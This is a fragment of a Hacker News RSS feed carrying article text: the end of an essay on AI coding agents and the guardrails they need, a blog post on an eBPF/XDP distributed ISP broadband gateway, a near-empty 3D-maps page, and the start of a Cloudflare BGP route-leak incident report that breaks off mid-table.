    &lt;p&gt;Front-end versus backend makes a huge difference. Language is a poor medium for designing easing curves and describing aesthetic feelings ‚Äì I always need to touch the CSS, and it‚Äôs often faster to just tweak directly than try to explain what I want. Yegge‚Äôs CLI tooling is much easier to validate with pass/fail tests than evaluating whether a notification system ‚Äúfeels calm enough‚Äù. Model competence also varies wildly by language; prompting React and Tailwind gives you much better results than Rust or Haskell, where the models still regularly choke on borrow checkers and type systems.&lt;/p&gt;
    &lt;head rend="h3"&gt;Access to feedback loops and definitions of succes&lt;/head&gt;
    &lt;p&gt;The more agents can validate their own work, the better the results. If you let agents run tests and see the output, they quickly learn what‚Äôs broken and how to fix it. If you let them open browsers, take screenshots, and click around, they can spot their mistakes. Tools like the Ralph Wiggum plugin lean into this ‚Äì it loops until tests pass or some specific condition is validated. This doesn‚Äôt work for less defined, clear cut work though. If you try to make an agent design a visual diagram for you, it‚Äôs going to struggle. It doesn‚Äôt know your aesthetic preferences and can‚Äôt really ‚Äúsee‚Äù what it‚Äôs making.&lt;/p&gt;
    &lt;head rend="h3"&gt;Risk tolerance for shit going wrong&lt;/head&gt;
    &lt;p&gt;Stakes matter. If an agent breaks some images on your personal blog, you‚Äôll recover. But if you‚Äôre running a healthcare system where a bug could miscalculate drug dosages, or a banking app moving actual money around, you can‚Äôt just wave an agent at it and hope. Consequences scale up fast. Corporate software has people whose entire job is compliance and regulatory sign-off ‚Äì they need to see the code, understand it, verify it meets requirements. Those people aren‚Äôt going to let you widly run Gas Town over projects without serious guardrails in place.&lt;/p&gt;
    &lt;p&gt;‚ÄúGas Town sounds fun if you are accountable to nobody: not for code quality, design coherence or inferencing costs. The rest of us are accountable for at least the first two and even in corporate scenarios where there is a blank check for tokens, that can‚Äôt last. So the bottleneck is going to be how fast humans can review code and agree to take responsibility for it.‚Äù&lt;/p&gt;
    &lt;head rend="h3"&gt;Greenfield vs. brownfield projects&lt;/head&gt;
    &lt;p&gt;Starting fresh (greenfield), means you can let agents make architectural decisions and establish patterns ‚Äì if you don‚Äôt like them, you can easily throw it out and restart. The cost of mistakes is low. But in an existing codebase (brownfield) with years of accumulated conventions, implicit patterns, and code that exists for reasons nobody remembers anymore, agents need much tighter supervision. They‚Äôll happily introduce a new pattern that contradicts the three other ways this codebase already solves the same problem.&lt;/p&gt;
    &lt;head rend="h3"&gt;Number of collaborators&lt;/head&gt;
    &lt;p&gt;If you‚Äôre solo of course you can YOLO. If you‚Äôre working with more than a handful of people, you‚Äôll have to agree on coding standards and agent rules. This creates its own overhead: updating the AGENTS.md file, picking MCPs, writing commands and skills and rules and whatever else we invent to constrain these things. The pace of change when you‚Äôre all using agents can be overwhelming and you need to figure out a sensible reviewing pipeline to manage it. Team coordination can fall apart when everyone‚Äôs agents start moving too fast. You might show up in the morning and discover someone‚Äôs agent renamed the database schema while another agent refactored the whole API layer, and neither of which jive with your giant, unmerged feature.&lt;/p&gt;
    &lt;head rend="h3"&gt;Your experience level&lt;/head&gt;
    &lt;p&gt;More senior developers can prompt better, debug better, and setup more stringent preferences earned through decades of seeing what can go wrong in scaled, production environments. They can recognize patterns: ‚Äúoh, that‚Äôs a memory leak‚Äù or ‚Äúthat‚Äôs going to deadlock under load.‚Äù Newer developers don‚Äôt have that catalog of failures yet and are much more likely to prompt their own personal house of cards. The tests might pass and everything looks fine until you hit production traffic or someone enters a weird character. It is hard to defend against unknown unknowns.&lt;/p&gt;
    &lt;p&gt;Given all these ‚Äúit depends‚Äù considerations, I‚Äôm currently in the code-must-be-close camp for most serious work done by professional developers. But I expect I‚Äôll shift to the code-at-a-distance camp over the next year or two as the harnesses and tools we wrap around these agents mature. If we can ship them with essential safe guards and quality gates, the risks drop. Sure, the models will also improve, but the infrastructure matters far more: validation loops, tests, and specialised subagents who focus on security, debugging, and code quality are what will make code-at-a-distance feasible.&lt;/p&gt;
    &lt;p&gt;We have many, continuous versions of the code distance debate interally at Github Next . One of the projects within the team driving this is Agentic Workflows ‚Äì autonomous agents run through GitHub Actions in response to events: new PRs, new issues, or specific times of day. Every commit can trigger a security review agent, an accessibility audit, and a documentation updater, all running in parallel alongside traditional CI/CD tests before anything lands in main. The team building it rarely touches code and do most of their work by directing agents from their phones. It‚Äôs these kinds of guardrails that makes a hands-off Sim-City-esque orchestrator system feel less terrifying to me.&lt;/p&gt;
    &lt;p&gt;I don‚Äôt believe Gas Town itself is ‚Äúit‚Äù. It‚Äôs not going to evolve into the thing we all use, day in and day out, in 2027. As I said, it‚Äôs a provocative piece of speculative design, not a system many people will use in earnest. In the same way any poorly designed object or system gets abandoned, this manic creation is too poorly thought through to persist. But the problems it‚Äôs wrestling with and the patterns it has sketched out will unquestionably show up in the next generation of development tools.&lt;/p&gt;
    &lt;p&gt;As the pace of software development speeds up, we‚Äôll feel the pressure intensify in other parts of the pipeline: thoughtful design, critical thinking, user research, planning and coordination within teams, deciding what to build, and whether it‚Äôs been built well. The most valuable tools in this new world won‚Äôt be the ones that generate the most code fastest. They‚Äôll be the ones that help us think more clearly, plan more carefully, and keep the quality bar high while everything accelerates around us.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46734302</guid><pubDate>Fri, 23 Jan 2026 16:19:18 +0000</pubDate></item><item><title>Killing the ISP Appliance: An eBPF/XDP Approach to Distributed BNG</title><link>https://markgascoyne.co.uk/posts/ebpf-bng/</link><description>&lt;doc fingerprint="bd5a3910e1c27e71"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Killing the ISP Appliance: An eBPF/XDP Approach to Distributed BNG&lt;/head&gt;
    &lt;p&gt;I used to work for an ISP startup that was building next-generation infrastructure. The company didn‚Äôt make it, but the problems we were trying to solve stuck with me. So I spent a few weeks building what we never got to: an open-source, eBPF-accelerated BNG that runs directly on OLT hardware.&lt;/p&gt;
    &lt;p&gt;This post explains the architecture and why I think it‚Äôs the future of ISP edge infrastructure.&lt;/p&gt;
    &lt;head rend="h2"&gt;The Problem: Centralised BNG is a Bottleneck&lt;/head&gt;
    &lt;p&gt;Traditional ISP architecture looks like this:&lt;/p&gt;
    &lt;code&gt;Customer ‚Üí ONT ‚Üí OLT ‚Üí [BNG Appliance] ‚Üí Internet
                            ‚Üë
               Single point of failure
               Expensive proprietary hardware
               All subscriber traffic flows through here
&lt;/code&gt;
    &lt;p&gt;Every subscriber‚Äôs traffic - DHCP, authentication, NAT, QoS - flows through a central BNG appliance. These boxes cost six figures, require vendor support contracts, and create a single point of failure. When they go down, everyone goes down.&lt;/p&gt;
    &lt;p&gt;The industry‚Äôs answer has been to buy bigger boxes with more redundancy. But what if we flipped the model entirely?&lt;/p&gt;
    &lt;head rend="h2"&gt;The Idea: Distribute the BNG to the Edge&lt;/head&gt;
    &lt;p&gt;What if, instead of funneling all traffic through a central appliance, we ran BNG functions directly on the OLT hardware at each edge site?&lt;/p&gt;
    &lt;code&gt;Customer ‚Üí ONT ‚Üí OLT(+BNG) ‚Üí Internet
                    ‚Üë
       Subscriber traffic stays LOCAL
       No central bottleneck
       Each site operates independently
&lt;/code&gt;
    &lt;p&gt;This isn‚Äôt a new idea - it‚Äôs essentially what hyperscalers do with their edge infrastructure. But ISPs have been slow to adopt it because:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Traditional BNG software assumes a central deployment&lt;/item&gt;
      &lt;item&gt;State management (IP allocations, sessions) is hard to distribute&lt;/item&gt;
      &lt;item&gt;Performance requirements seemed to need specialised hardware&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The key insight is that modern Linux with eBPF/XDP can handle ISP-scale packet processing on commodity hardware.&lt;/p&gt;
    &lt;head rend="h2"&gt;Why eBPF/XDP, Not VPP?&lt;/head&gt;
    &lt;p&gt;When I started this project, I evaluated two approaches:&lt;/p&gt;
    &lt;p&gt;VPP (Vector Packet Processing) - The industry darling for high-performance networking. Used in production by big telcos. Handles 100+ Gbps easily.&lt;/p&gt;
    &lt;p&gt;eBPF/XDP - Linux kernel‚Äôs programmable packet processing. Lower peak throughput, but much simpler operations.&lt;/p&gt;
    &lt;p&gt;For edge deployment (10-40 Gbps per OLT), I chose eBPF/XDP:&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="3"&gt;
        &lt;cell role="head"&gt;Aspect&lt;/cell&gt;
        &lt;cell role="head"&gt;eBPF/XDP&lt;/cell&gt;
        &lt;cell role="head"&gt;VPP&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Performance&lt;/cell&gt;
        &lt;cell&gt;10-40 Gbps ‚úì&lt;/cell&gt;
        &lt;cell&gt;100+ Gbps (overkill)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Deployment&lt;/cell&gt;
        &lt;cell&gt;Standard Linux kernel&lt;/cell&gt;
        &lt;cell&gt;DPDK, hugepages, dedicated NICs&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Operations&lt;/cell&gt;
        &lt;cell&gt;systemd service&lt;/cell&gt;
        &lt;cell&gt;Complex dedicated setup&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Debugging&lt;/cell&gt;
        &lt;cell&gt;tcpdump, bpftool, perf&lt;/cell&gt;
        &lt;cell&gt;Custom tools&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;Learning curve&lt;/cell&gt;
        &lt;cell&gt;Steep but well-documented&lt;/cell&gt;
        &lt;cell&gt;Very steep, less documentation&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;VPP is the right choice for core aggregation. But for edge sites? eBPF/XDP is simpler and sufficient.&lt;/p&gt;
    &lt;head rend="h2"&gt;The Architecture&lt;/head&gt;
    &lt;p&gt;Here‚Äôs what I built:&lt;/p&gt;
    &lt;code&gt;‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ  CENTRAL (Kubernetes)                                        ‚îÇ
‚îÇ  Nexus: CRDT state sync, hashring IP allocation             ‚îÇ
‚îÇ  (Control plane only - NO subscriber traffic)               ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
                           ‚îÇ Config sync, metrics
         ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
         ‚ñº                 ‚ñº                 ‚ñº
   ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê     ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê     ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
   ‚îÇ OLT-BNG 1 ‚îÇ     ‚îÇ OLT-BNG 2 ‚îÇ     ‚îÇ OLT-BNG N ‚îÇ
   ‚îÇ eBPF/XDP  ‚îÇ     ‚îÇ eBPF/XDP  ‚îÇ     ‚îÇ eBPF/XDP  ‚îÇ
   ‚îÇ 1500 subs ‚îÇ     ‚îÇ 2000 subs ‚îÇ     ‚îÇ 1800 subs ‚îÇ
   ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò     ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò     ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
         ‚îÇ                 ‚îÇ                 ‚îÇ
    Traffic LOCAL     Traffic LOCAL     Traffic LOCAL
         ‚Üì                 ‚Üì                 ‚Üì
       ISP PE           ISP PE           ISP PE
&lt;/code&gt;
    &lt;p&gt;Key principle: Subscriber traffic never touches central infrastructure. The central Nexus server only handles control plane operations - config distribution, IP allocation coordination, monitoring.&lt;/p&gt;
    &lt;head rend="h3"&gt;Two-Tier DHCP: Fast Path + Slow Path&lt;/head&gt;
    &lt;p&gt;The performance-critical insight is that most DHCP operations are renewals from known subscribers. We can handle these entirely in the kernel:&lt;/p&gt;
    &lt;code&gt;DHCP Request arrives
        ‚îÇ
        ‚ñº
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ               XDP Fast Path (Kernel)                   ‚îÇ
‚îÇ                                                        ‚îÇ
‚îÇ  1. Parse Ethernet ‚Üí IP ‚Üí UDP ‚Üí DHCP                  ‚îÇ
‚îÇ  2. Extract client MAC                                 ‚îÇ
‚îÇ  3. Lookup MAC in eBPF subscriber_pools map           ‚îÇ
‚îÇ                                                        ‚îÇ
‚îÇ  CACHE HIT?                                           ‚îÇ
‚îÇ  ‚îú‚îÄ YES: Generate DHCP ACK in kernel                  ‚îÇ
‚îÇ  ‚îÇ       Return XDP_TX (~10Œºs latency)                ‚îÇ
‚îÇ  ‚îî‚îÄ NO:  Return XDP_PASS ‚Üí userspace                  ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
        ‚îÇ XDP_PASS (cache miss)
        ‚ñº
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ            Go Slow Path (Userspace)                    ‚îÇ
‚îÇ                                                        ‚îÇ
‚îÇ  1. Lookup subscriber in Nexus cache                  ‚îÇ
‚îÇ  2. Get pre-allocated IP from subscriber record       ‚îÇ
‚îÇ  3. Update eBPF cache for future fast path hits       ‚îÇ
‚îÇ  4. Send DHCP response                                ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
&lt;/code&gt;
    &lt;p&gt;Results:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Fast path: ~10Œºs latency, 45,000+ requests/sec&lt;/item&gt;
      &lt;item&gt;Slow path: ~10ms latency, 5,000 requests/sec&lt;/item&gt;
      &lt;item&gt;Cache hit rate after warmup: &amp;gt;95%&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;IP Allocation: Hashring at RADIUS Time&lt;/head&gt;
    &lt;p&gt;Here‚Äôs a design decision that simplified everything: IP allocation happens at RADIUS authentication time, not DHCP time.&lt;/p&gt;
    &lt;code&gt;1. Subscriber authenticates via RADIUS
2. RADIUS success ‚Üí Nexus allocates IP from hashring (deterministic)
3. IP stored in subscriber record
4. DHCP is just a READ operation (lookup pre-allocated IP)
&lt;/code&gt;
    &lt;p&gt;This means:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;No IP conflicts between distributed BNG nodes&lt;/item&gt;
      &lt;item&gt;DHCP fast path can run entirely in eBPF (no userspace allocation decisions)&lt;/item&gt;
      &lt;item&gt;Subscribers get the same IP every time (hashring determinism)&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Offline-First Edge Operation&lt;/head&gt;
    &lt;p&gt;What happens when an edge site loses connectivity to central Nexus?&lt;/p&gt;
    &lt;p&gt;Keeps working:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Existing subscriber sessions (cached in eBPF maps)&lt;/item&gt;
      &lt;item&gt;DHCP lease renewals&lt;/item&gt;
      &lt;item&gt;NAT translations&lt;/item&gt;
      &lt;item&gt;QoS enforcement&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Degraded:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;New subscriber authentication (no RADIUS)&lt;/item&gt;
      &lt;item&gt;New IP allocations (falls back to local pool)&lt;/item&gt;
      &lt;item&gt;Config updates (queued until reconnect)&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The edge sites are designed to be autonomous. Central coordination is nice to have, not required.&lt;/p&gt;
    &lt;head rend="h2"&gt;The Implementation&lt;/head&gt;
    &lt;p&gt;The BNG is a single Go binary with embedded eBPF programs:&lt;/p&gt;
    &lt;code&gt;bng/
‚îú‚îÄ‚îÄ cmd/bng/              # Main binary
‚îú‚îÄ‚îÄ pkg/
‚îÇ   ‚îú‚îÄ‚îÄ ebpf/             # eBPF loader and map management
‚îÇ   ‚îú‚îÄ‚îÄ dhcp/             # DHCP slow path server
‚îÇ   ‚îú‚îÄ‚îÄ nexus/            # Central coordination client
‚îÇ   ‚îú‚îÄ‚îÄ radius/           # RADIUS client
‚îÇ   ‚îú‚îÄ‚îÄ qos/              # QoS/rate limiting
‚îÇ   ‚îú‚îÄ‚îÄ nat/              # NAT44/CGNAT
‚îÇ   ‚îú‚îÄ‚îÄ pppoe/            # PPPoE server
‚îÇ   ‚îú‚îÄ‚îÄ routing/          # BGP/FRR integration
‚îÇ   ‚îî‚îÄ‚îÄ metrics/          # Prometheus metrics
‚îú‚îÄ‚îÄ bpf/
‚îÇ   ‚îú‚îÄ‚îÄ dhcp_fastpath.c   # XDP DHCP fast path
‚îÇ   ‚îú‚îÄ‚îÄ qos_ratelimit.c   # TC QoS eBPF
‚îÇ   ‚îú‚îÄ‚îÄ nat44.c           # TC NAT eBPF
‚îÇ   ‚îî‚îÄ‚îÄ antispoof.c       # TC anti-spoofing
&lt;/code&gt;
    &lt;p&gt;Running it:&lt;/p&gt;
    &lt;code&gt;# Standalone mode (local IP pool)
sudo ./bng run \
  --interface eth1 \
  --pool-network 10.0.1.0/24 \
  --pool-gateway 10.0.1.1

# Production mode (with Nexus coordination)
sudo ./bng run \
  --interface eth1 \
  --nexus-url http://nexus.internal:9000 \
  --radius-enabled \
  --radius-servers radius.isp.com:1812
&lt;/code&gt;
    &lt;head rend="h2"&gt;Hardware: White-Box OLTs&lt;/head&gt;
    &lt;p&gt;This runs on any Linux box with a modern kernel (5.10+), but the target is white-box OLTs like the Radisys RLT-1600G:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;16 GPON/XGS-PON ports&lt;/item&gt;
      &lt;item&gt;Runs Debian Linux&lt;/item&gt;
      &lt;item&gt;~$7,400 USD (vs six figures for traditional BNG)&lt;/item&gt;
      &lt;item&gt;1,500-2,000 subscribers per unit&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The same approach works with any OLT that runs Linux and exposes its network interfaces to the OS.&lt;/p&gt;
    &lt;head rend="h2"&gt;What‚Äôs Next&lt;/head&gt;
    &lt;p&gt;The code is working but not production-ready. Missing pieces:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Device authentication - TPM attestation or similar to prevent rogue OLT-BNG devices&lt;/item&gt;
      &lt;item&gt;IPv6 support - DHCPv6 and SLAAC&lt;/item&gt;
      &lt;item&gt;Full RADIUS accounting - Currently basic&lt;/item&gt;
      &lt;item&gt;Management UI - Currently CLI and Prometheus metrics only&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;I‚Äôm considering open-sourcing the entire thing. The BNG market is dominated by expensive proprietary solutions, and there‚Äôs no good open-source alternative. Maybe there should be.&lt;/p&gt;
    &lt;head rend="h2"&gt;The Bigger Picture&lt;/head&gt;
    &lt;p&gt;Traditional ISP infrastructure was designed when compute was expensive and networks were slow. Centralised appliances made sense when you needed specialised hardware for packet processing.&lt;/p&gt;
    &lt;p&gt;But compute is cheap now, and eBPF lets us do packet processing in the Linux kernel at line rate. The economics have shifted - it‚Äôs now cheaper to distribute the BNG to hundreds of edge sites than to build a few massive central boxes.&lt;/p&gt;
    &lt;p&gt;This isn‚Äôt just about saving money. Distributed architecture is more resilient (no single point of failure), lower latency (traffic stays local), and operationally simpler (it‚Äôs just Linux).&lt;/p&gt;
    &lt;p&gt;The hyperscalers figured this out years ago. ISPs are slowly catching up.&lt;/p&gt;
    &lt;p&gt;Interested in this approach? The code is at github.com/codelaboratoryltd/bng and github.com/codelaboratoryltd/nexus. I‚Äôd love to hear from anyone working on similar problems in the ISP/altnet space.&lt;/p&gt;
    &lt;p&gt;If you‚Äôre building ISP infrastructure and want to chat about eBPF, distributed systems, or why vendor BNG appliances are a racket, reach out.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46735179</guid><pubDate>Fri, 23 Jan 2026 17:29:53 +0000</pubDate></item><item><title>Show HN: New 3D Mapping website - Create heli orbits and "playable" map tours.</title><link>https://www.easy3dmaps.com/gallery</link><description>&lt;doc fingerprint="574ff5c9fffed657"&gt;
  &lt;main&gt;
    &lt;p&gt;Solutions Quick360 Gallery How-to&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46735231</guid><pubDate>Fri, 23 Jan 2026 17:34:29 +0000</pubDate></item><item><title>Route leak incident on January 22, 2026</title><link>https://blog.cloudflare.com/route-leak-incident-january-22-2026/</link><description>&lt;doc fingerprint="f5aab1a1e428d1f3"&gt;
  &lt;main&gt;
    &lt;div&gt;
      &lt;p&gt;On January 22, 2026, an automated routing policy configuration error caused us to leak some Border Gateway Protocol (BGP) prefixes unintentionally from a router at our data center in Miami, Florida. While the route leak caused some impact to Cloudflare customers, multiple external parties were also affected because their traffic was accidentally funnelled through our Miami data center location.&lt;/p&gt;
      &lt;p&gt;The route leak lasted 25 minutes, causing congestion on some of our backbone infrastructure in Miami, elevated loss for some Cloudflare customer traffic, and higher latency for traffic across these links. Additionally, some traffic was discarded by firewall filters on our routers that are designed to only accept traffic for Cloudflare services and our customers.&lt;/p&gt;
      &lt;p&gt;While we√¢ve written about route leaks before, we rarely find ourselves causing them. This route leak was the result of an accidental misconfiguration on a router in Cloudflare√¢s network, and only affected IPv6 traffic. We sincerely apologize to the users, customers, and networks we impacted yesterday as a result of this BGP route leak.&lt;/p&gt;
      &lt;p&gt;We have written multiple times about BGP route leaks, and we even record route leak events on Cloudflare Radar for anyone to view and learn from. To get a fuller understanding of what route leaks are, you can refer to this detailed background section, or refer to the formal definition within RFC7908.√Ç &lt;/p&gt;
      &lt;p&gt;Essentially, a route leak occurs when a network tells the broader Internet to send it traffic that it's not supposed to forward. Technically, a route leak occurs when a network, or Autonomous System (AS), appears unexpectedly in an AS path. An AS path is what BGP uses to determine the path across the Internet to a final destination. An example of an anomalous AS path indicative of a route leak would be finding a network sending routes received from a peer to a provider.&lt;/p&gt;
      &lt;p&gt;During this type of route leak, the rules of valley-free routing are violated, as BGP updates are sent from AS64501 to their peer (AS64502), and then unexpectedly up to a provider (AS64503). Oftentimes the leaker, in this case AS64502, is not prepared to handle the amount of traffic they are going to receive and may not even have firewall filters configured to accept all of the traffic coming in their direction. In simple terms, once a route update is sent to a peer or provider, it should only be sent further to customers and not to another peer or provider AS.&lt;/p&gt;
      &lt;p&gt;During the incident on January 22, we caused a similar kind of route leak, in which we took routes from some of our peers and redistributed them in Miami to some of our peers and providers. According to the route leak definitions in RFC7908, we caused a mixture of Type 3 and Type 4 route leaks on the Internet.√Ç &lt;/p&gt;
      &lt;table&gt;
        &lt;row&gt;
          &lt;cell role="head"&gt;
            &lt;p&gt;Time (UTC)&lt;/p&gt;
          &lt;/cell&gt;
          &lt;cell role="head"&gt;
            &lt;p&gt;Event&lt;/p&gt;
          &lt;/cell&gt;
        &lt;/row&gt;
        &lt;row&gt;
          &lt;cell&gt;
            &lt;p&gt;2026-01-22 19:52 UTC&lt;/p&gt;
          &lt;/cell&gt;
          &lt;cell&gt;
            &lt;p&gt;A change that ultimately triggers the routing policy bug is merged in our network automation code repository&lt;/p&gt;
          &lt;/cell&gt;
        &lt;/row&gt;
        &lt;row&gt;
          &lt;cell&gt;
            &lt;p&gt;2026-01-22 20:25 UTC&lt;/p&gt;
          &lt;/cell&gt;
          &lt;cell&gt;
            &lt;p&gt;Automation is run on single Miami edge-router resulting in unexpected advertisements to BGP transit providers and peers&lt;/p&gt;
            &lt;p&gt;IMPACT START&lt;/p&gt;
          &lt;/cell&gt;
        &lt;/row&gt;
        &lt;row&gt;
          &lt;cell&gt;
            &lt;p&gt;2026-01-22 20:40 UTC&lt;/p&gt;
          &lt;/cell&gt;
          &lt;cell&gt;
            &lt;p&gt;Network team begins investigating unintended route advertisements from Miami&lt;/p&gt;
          &lt;/cell&gt;
        &lt;/row&gt;
        &lt;row&gt;
          &lt;cell&gt;
            &lt;p&gt;2026-01-22 20:44 UTC&lt;/p&gt;
          &lt;/cell&gt;
          &lt;cell&gt;
            &lt;p&gt;Incident is raised to coordinate response&lt;/p&gt;
          &lt;/cell&gt;
        &lt;/row&gt;
        &lt;row&gt;
          &lt;cell&gt;
            &lt;p&gt;2026-01-22 20:50 UTC&lt;/p&gt;
          &lt;/cell&gt;
          &lt;cell&gt;
            &lt;p&gt;The bad configuration change is manually reverted by a network operator, and automation is paused for the router, so it cannot run again&lt;/p&gt;
            &lt;p&gt;IMPACT STOP&lt;/p&gt;
          &lt;/cell&gt;
        &lt;/row&gt;
        &lt;row&gt;
          &lt;cell&gt;
            &lt;p&gt;2026-01-22 21:47 UTC&lt;/p&gt;
          &lt;/cell&gt;
          &lt;cell&gt;
            &lt;p&gt;The change that triggered the leak is reverted from our code repository&lt;/p&gt;
          &lt;/cell&gt;
        &lt;/row&gt;
        &lt;row&gt;
          &lt;cell&gt;
            &lt;p&gt;2026-01-22 22:07 UTC&lt;/p&gt;
          &lt;/cell&gt;
          &lt;cell&gt;
